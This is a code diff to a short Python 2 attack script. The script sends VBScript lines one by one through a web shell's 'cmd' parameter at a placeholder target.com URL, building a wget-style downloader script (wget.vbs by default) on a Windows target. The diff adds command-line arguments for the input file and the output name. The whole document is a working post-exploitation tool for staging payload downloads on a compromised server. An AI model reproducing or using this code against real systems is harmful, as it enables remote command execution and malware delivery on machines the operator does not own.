@@ -2,8 +2,9 @@
 
 import urllib2
 import urllib
-
+import argparse
 '''
+	@author : khaedir
 	reads the vbs script each line and send to server.
 	it will create vbsscript file as output
 	vbscript run on windows base target
@@ -20,19 +21,39 @@ def read_file(file):
 		data.append(line.strip())
 	return data
 
-def send_payload(url, data):
+def send_payload(url, data, output):
 	req = urllib2.Request(url)
 	req.add_header('User-agent', 'Mozilla/5.0')
 	for line in data:
-		print 'url : %s '%(url+urllib.quote(line))
-		r = urllib2.urlopen(url+urllib.quote(line))
-		print r.code
+		fixline = "%s %s" %(line,output)
+		print ']sending payload to the target]'
+		r = urllib2.urlopen(url+urllib.quote(fixline))
+		if r.code == 200:
+			print "[Success]"
 
 def main():
-	filename = 'wget-with-argument.txt'
-	data	 = read_file(filename)
-	url 	 = 'http://www.target.com/shell.php?cmd='
-	send_payload(url, data)
+	
+	output = ""
+
+	parser = argparse.ArgumentParser()
+	#positional arguments
+	parser.add_argument("--file", help="load file that contain vbs script")
+	parser.add_argument("--output", help="give the ouput filename on target system")
+	args = parser.parse_args()
+
+	if args.file == None or args.file == "":
+		print "file harus di isi"
+	elif args.output == None:
+		output = "wget.vbs"
+	else:
+		output = args.output + ".vbs"
+	
+	fname = args.file
+
+	filename 	 = fname
+	data	 	 = read_file(filename)
+	shell_url 	 = 'http://target.com/shell.php?cmd='
+	send_payload(shell_url, data, output)
 
 
 if __name__ == '__main__':
